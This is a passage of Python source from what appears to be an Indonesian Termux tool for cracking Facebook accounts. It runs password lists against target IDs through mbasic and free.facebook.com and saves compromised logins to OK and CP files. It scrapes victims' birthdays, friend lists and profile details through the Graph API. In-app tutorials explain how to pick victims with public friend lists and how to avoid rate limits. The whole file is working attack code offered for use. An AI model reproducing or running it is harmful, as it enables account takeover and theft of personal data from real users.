                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sHikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sHikmat%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r%s[%sHikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sHikmat%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sHikmat%s] %s • %s • %s %s %s%s"%(K,U,K,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp = "\r%s[%sHikmat%s] %s • %s%s     "%(K,U,K,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok = "\r%s[%sHikmat%s] %s • %s%s%s     "%(H,U,H,fl.get("id"),i,tahun(fl.get("id")),U)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r%s[%sMat%s][%s%s/%s%s][%sLolos:%s%s][%sSesi:%s%s]%s"%(H,O,H,K,self.ko,len(self.fl),H,O,len(self.ada),H,O,len(self.cp),H,O), end=' ');sys.stdout.flush()
        except:
            self.free_opsi(fl)
def target():
    try:token = open('token.txt','r').read()
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,H,M,H));menu_log()
    idt = input("%s╠══[%s•%s] %sID Target : "%(H,O,H,K))
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,H,M,H));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["tanggal Lahir"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["kelamin"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s╠══[%s•%s] %sNama : %s'%(H,O,H,K,nm))
    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(H,O,H,K,nd))
    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(H,O,H,K,nt))
    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(H,O,H,K,nb))
    jalan('%s╠══[%s•%s] %sTTL : %s'%(H,O,H,K,ut))
    jalan('%s╠══[%s•%s] %sGender : %s'%(H,O,H,K,gd))
    jalan('%s╠══[%s•%s] %sEmail : %s'%(H,O,H,K,em))
    jalan('%s╠══[%s•%s] %sLink : %s'%(H,O,H,K,lk))
    jalan('%s╠══[%s•%s] %sUsername : %s'%(H,O,H,K,us))
    jalan('%s╠══[%s•%s] %sAgama : %s'%(H,O,H,K,rg))
    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(H,O,H,K,rl))
    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(H,O,H,K,rls))
    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(H,O,H,K,lc))
    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(H,O,H,K,ht))
    jalan('%s╠══[%s•%s] %sTentang : %s'%(H,O,H,K,ab))
    jalan('%s╠══[%s•%s] %sLocale : %s'%(H,O,H,K,lo))
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(H,O,H,K))
    menu()
def teman_target():
    it = input('%s╠══[%s•%s] %sID Target : '%(H,O,H,K))
    try:
        token = open('token.txt','r').read()
        mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
        nn = json.loads(mm.text)
        print ('%s╠══[%s•%s] %sName : %s'%(H,O,H,K,nn['name']))
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Salah/Kadaluarsa'%(M,H,M,H))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(H,O,H,K))
    print('%s║%s'%(H,U))
    ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
    idi = json.loads(ada.text)
    for x in idi['data']:
        tt.append(x['id'])
    for id in tt:
        try:
            ada2 = requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(id,token))
            idi2 = json.loads(ada2.text)
            try:
                for b in idi2['data']:
                    te.append(b['id'])
            except KeyError:
                print('%s╠══%s[%s!%s] %sPrivate'%(O,H,M,H,O))
            print('╠══[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('%s╠══%s[%s!%s] %sAkun Kena Spam'%(O,H,M,H,O))
    print('%s║'%(O))
    input('%s╚══%s[ %sReturn %s]'%(O,H,P,H))
    menu()
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %sCrack Hasil %s]'%(H,O,H))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sCheck Has OK'%(H,O,H,K))
    print('%s╠══[%s2%s] %sCheck Hasil CP'%(H,O,H,K))
    ch = input('%s╠══[%s•%s] %sPilih : '%(H,O,H,K))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,H,M,H))
        menu()
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            print('%s║'%(H))
            print('%s╠══[%s Crack Results Stored in File OK%s]'%(H,O,H))
            print('%s║'%(H))
            for file in okl:
                print('%s╠══[%s•%s] %s%s'%(H,O,H,K,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sEnter File Name : '%(H,O,H,K))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sCorrect Content'%(M,H,M,H))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(H,O,H,K,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s Tidak Ada Hasil %s]'%(M,H,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s║'%(H))
            print('%s╠══[%s Crack Results Stored in CP Files %s]'%(H,O,H))
            print('%s║'%(H))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(H,O,H,K,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %sEnter File Name : '%(H,O,H,K))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %sCorrect Content'%(M,H,M,H))
                hasil()
            os.system('cat CP/%s'%(files))
            ppp = open("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %sTotal Crack Result Date %s is %s Account'%(H,O,H,K,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s No Results Found %s]'%(M,H,M))
    else:
        jalan('%s╚══[%s!%s] %sCorrect Content'%(M,H,M,H))
        menu()
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(H,O,H,K))
    menu()
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s[%s!%s] %sAkun Terspam"%(M,H,M,H))
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %sAkun Lolos Tidak Sesi"%(H,U,H,U))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %sOne Tap Account><"%(H,U,H,U))
        else:
            print("%s[%s•%s] %sSesi %s Option "%(H,O,H,K,str(len(ngew))))
        for opt in range(len(ngew)):
            print(" "*3, str(opt+1)+". "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
    else:
        print("%s[%s!%s] %sPassword Telah Diganti"%(M,H,M,H))
def cek_hasil():
    jalan('%s╠══[ %sCheck Crack Result Account Options %s]'%(H,O,H))
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sExample File : CP/%s.txt'%(H,O,H,K,tanggal))
    files = input('%s╠══[%s•%s] %sFile : '%(H,O,H,K))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s╚══[%s!%s] %sFile Tidak Ada"%(M,H,M,H))
        time.sleep(2); cek_hasil()
    print("%s╚══[%s•%s] %sNumber of Accounts : %s"%(H,O,H,K,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s[%s•%s] %sCheck Login : %s"%(H,O,H,K,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('%s╔══[%s•%s] %s Checking Sukses'%(H,O,H,K))
    print('%s║'%(H))
    input('%s╚══[ %sKembali %s]%s'%(H,O,H,K))
    menu()
def var_menu():
    print('%s╔══[ %sSelect Method Login %s]'%(H,O,H))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sLogin with Token'%(H,O,H,K))
    print('%s╠══[%s2%s] %sLogin with Cookies'%(H,O,H,K))
    print('%s╠══[%s3%s] %sIngfo'%(H,O,H,K))
    print('%s╠══[%s4%s] %sInfo Author & Team Project'%(H,O,H,K))
    print('%s╠══[%s0%s] %sGo Back'%(H,O,H,K))
def var_tutor():
    mlaku('%s╔══[%s Tips & Tutorial %s]'%(H,O,H))
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sHow to Take Token'%(H,O,H,K))
    print('%s╠══[%s2%s] %sHow to Take Cookies'%(H,O,H,K))
    print('%s╠══[%s3%s] %sHow to Get Target'%(H,O,H,K))
    print('%s╠══[%s4%s] %sWays During the Crack Process'%(H,O,H,K))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(H))
    mlaku('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process %s║'%(H,O,H,K,U))
    mlaku('%s║ %s2 %s║ %sChange the Victim Account Password First          %s║'%(H,O,H,K,U))
    mlaku('%s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public   %s║'%(H,O,H,K,U))
    mlaku('%s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║'%(H,O,H,K,U))
    mlaku('%s║ %s5 %s║ %sMore Friends, More Possible Results  %s║'%(H,O,H,K,U))
    mlaku('%s║ %s6 %s║ %sTap Target Profile/Cover Photo                      %s║'%(H,O,H,K,U))
    mlaku('%s║ %s7 %s║ %ssee URL/Link Above, There is \ id = 10001xx\ %s║'%(H,O,H,K,U))
    mlaku('%s║ %s8 %s║ %sWell, thats a target ID ready to crack   %s║'%(H,O,H,K,U))
    mlaku('%s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process %s║'%(H,O,H,K,U))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(H))
    print('%s║'%(H))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(H))
    mlaku('%s║ %s1 %s║ %sMethod Api : Fast But Easy Process Spam            %s║'%(H,O,H,K,U))
    mlaku('%s║ %s2 %s║ %sMethod Mbasic : The process is quite fast, rarely spammed  %s║'%(H,O,H,K,U))
    mlaku('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK  %s║'%(H,O,H,K,U))
    mlaku('%s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)  %s║'%(H,O,H,K,U))
    mlaku('%s║ %s5 %s║ %sIf Results Do Not Appear While The Crack Is Running       %s║'%(H,O,H,K,U))
    mlaku('%s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                   %s║'%(H,O,H,K,U))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(H))
    print('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(H,O,H))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sRecode :'%(H,O,H,K))
    mlaku('%s║     • %sHikmat'%(H,O))
    mlaku('%s║     • %sPutri'%(H,O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(H,O,H,K))
    mlaku('%s║     • %sDapunta'%(H,O))
    mlaku('%s║     • %sRizal'%(O,P))
    mlaku('%s║'%(H))
    mlaku('%s╠══[%s•%s] %sTeam Project %sTeamCode%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sNdrii Tzy'%(H,O))
    mlaku('%s║     • %sYoggz Tzy'%(H,O))
    mlaku('%s║     • %sAkhmad Tzy'%(H,O))
    mlaku('%s║     • %sYayan XD '%(H,O))
    mlaku('%s║     • %sAngga XD'%(H,O))
    mlaku('%s║     • %sRisky'%(H,O))
    mlaku('%s║     • %sJeeck'%(H,O))
    mlaku('%s║     • %sDekura'%(H,O))
    mlaku('%s║     • %sKuhaku'%(H,O))
    mlaku('%s║     • %sYumme'%(H,O))
    mlaku('%s║     • %sFais'%(H,O))
    mlaku('%s║     • %sBlom Tersedia'%(H,O))
    mlaku('%s║'%(H))
def var_ugen():
    print("%s╠══[%s1%s] %sGet User Agent"%(H,O,H,K))
    print("%s╠══[%s2%s] %sChange User Agent%s(%sManual%s)"%(H,O,H,K,H,O,H))
    print("%s╠══[%s3%s] %sChange User Agent %s(%sAdjust HP%s)"%(H,O,H,K,H,O,H))
    print("%s╠══[%s4%s] %sDelete User Agent"%(H,O,H,K))
    print("%s╠══[%s5%s] %sCheck User Agent"%(H,O,H,K))
    print("%s╠══[%s0%s] %sReturn"%(H,O,H,K))
def start_method():
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sMethod Api'%(H,O,H,K))
    print('%s╠══[%s2%s] %sMethod Mbasic'%(H,O,H,K))
    print('%s╠══[%s3%s] %sMethod Free FB'%(H,O,H,K))
def start_methodezz():
    print('%s║'%(H))
    print('%s╠══[%s1%s] %sFast Crack %s[%s6 pass%s]'%(H,O,H,K,H,K,H))
    print('%s╠══[%s2%s] %sSlow Crack %s[%s9 pass%s]'%(H,O,H,K,H,K,H))
    print('%s╠══[%s3%s] %sVery Slow Crack %s[%s12 pass%s]'%(H,O,H,K,H,K,H))
    print('%s╠══[%s4%s] %sCrack Password Combine'%(H,O,H,K))
def started():
    print('%s║'%(H))
    print('%s╠══[%s•%s] %sCrack Is Running...'%(H,O,H,K))
    print('%s╠══[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(H,O,H,K,tanggal))
    print('%s╠══[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(H,O,H,K,tanggal))
    print('%s╚══[%s•%s] %sActivate Airplane Mode [5 Seconds Only] Every 5 Minutes\n'%(H,O,H,K))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass
if __name__=='__main__':
  os.system('git pull')
  folder()
  menu()
# Mau Ngapain Cuk?
